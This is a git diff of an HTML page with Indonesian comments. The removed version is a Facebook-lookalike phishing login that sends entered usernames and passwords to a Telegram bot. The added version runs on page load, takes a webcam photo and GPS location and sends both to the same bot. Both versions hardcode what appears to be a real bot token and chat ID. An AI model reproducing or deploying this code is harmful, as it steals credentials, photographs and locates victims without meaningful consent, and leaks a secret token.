@@ -1,139 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Facebook – log in or sign up</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Helvetica, Arial, sans-serif;
-      background-color: #f0f2f5;
-    }
-    .container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .login-box {
-      background: white;
-      padding: 20px 15px;
-      border-radius: 8px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-      width: 360px;
-      text-align: center;
-    }
-    .logo {
-      width: 240px;
-      margin: 0 auto 10px;
-    }
-    .logo img {
-      width: 100%;
-    }
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 14px;
-      margin-bottom: 12px;
-      border: 1px solid #dddfe2;
-      border-radius: 6px;
-      font-size: 17px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #1877f2;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 20px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #165ecb;
-    }
-    .forgot {
-      display: block;
-      margin-top: 15px;
-      margin-bottom: 15px;
-      font-size: 14px;
-      color: #1877f2;
-      text-decoration: none;
-    }
-    .line {
-      border-top: 1px solid #dadde1;
-      margin: 20px 0;
-    }
-    .create-btn {
-      background-color: #42b72a;
-      font-size: 17px;
-      font-weight: bold;
-    }
-    .create-btn:hover {
-      background-color: #36a420;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto GPS & Camera to Telegram</title>
 </head>
 <body>
-  <div class="container">
-    <div class="login-box">
-      <div class="logo">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" />
-      </div>
-      <form id="loginForm">
-        <input type="text" name="username" placeholder="Email or phone number" required />
-        <input type="password" name="password" placeholder="Password" required />
-        <button type="submit">Log In</button>
-        <a class="forgot" href="#">Forgotten password?</a>
-        <div class="line"></div>
-        <button type="button" class="create-btn">Create new account</button>
-      </form>
-    </div>
-  </div>
+<h2>Mengambil Foto dan Lokasi, Kirim ke Telegram</h2>
+<video id="video" width="320" height="240" autoplay muted></video>
+<img id="photo" width="320" height="240" />
+<p id="status">Mengambil data...</p>
 
-  <script>
-    function isValidEmail(email) {
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-    }
+<script>
+const video = document.getElementById('video');
+const photo = document.getElementById('photo');
+const status = document.getElementById('status');
 
-    function isValidPhone(phone) {
-      return /^[0-9]{10,15}$/.test(phone);
-    }
+// Ganti dengan token dan chat_id Telegram kamu
+const TELEGRAM_BOT_TOKEN = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
+const TELEGRAM_CHAT_ID = '7218964278';
 
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
-      const username = e.target.username.value.trim();
-      const password = e.target.password.value.trim();
+async function sendPhotoAndLocation(photoBase64, latitude, longitude) {
+  const textMessage = `Lokasi: https://maps.google.com/?q=${latitude},${longitude}`;
+  
+  // Kirim teks lokasi dulu
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: textMessage,
+    }),
+  });
 
-      if (!isValidEmail(username) && !isValidPhone(username)) {
-        alert("Masukkan email atau nomor HP yang valid!");
-        return;
+  // Kirim foto (hapus "data:image/png;base64," supaya Telegram terima)
+  const photoBase64Clean = photoBase64.replace(/^data:image\/png;base64,/, '');
+
+  const formData = new FormData();
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
+  formData.append('photo', photoBase64Clean);
+
+  // Kirim foto via sendPhoto API
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: formData,
+  });
+}
+
+async function start() {
+  try {
+    // Minta akses kamera
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+  } catch (err) {
+    status.textContent = 'Gagal akses kamera: ' + err.message;
+    return;
+  }
+
+  if (!navigator.geolocation) {
+    status.textContent = 'Browser tidak support geolocation';
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      // Ambil foto dari video
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 320;
+      canvas.height = video.videoHeight || 240;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const photoDataUrl = canvas.toDataURL('image/png');
+      photo.src = photoDataUrl;
+
+      status.textContent = 'Mengirim data ke Telegram...';
+
+      try {
+        await sendPhotoAndLocation(photoDataUrl, lat, lon);
+        status.textContent = 'Data berhasil dikirim ke Telegram!';
+      } catch (e) {
+        status.textContent = 'Gagal kirim ke Telegram: ' + e.message;
       }
+    },
+    (err) => {
+      status.textContent = 'Gagal dapat lokasi: ' + err.message;
+    }
+  );
+}
 
-      const botToken = '7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k';
-      const chatId = '7218964278';
-      const message = `Percobaan Login:\nUsername: ${username}\nPassword: ${password}`;
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      }).then(response => {
-        if (response.ok) {
-          alert("Terkirim ke Telegram!");
-        } else {
-          alert("Gagal mengirim!");
-        }
-      });
-    });
-  </script>
+// Jalankan langsung saat halaman dibuka
+start();
+</script>
 </body>
 </html>
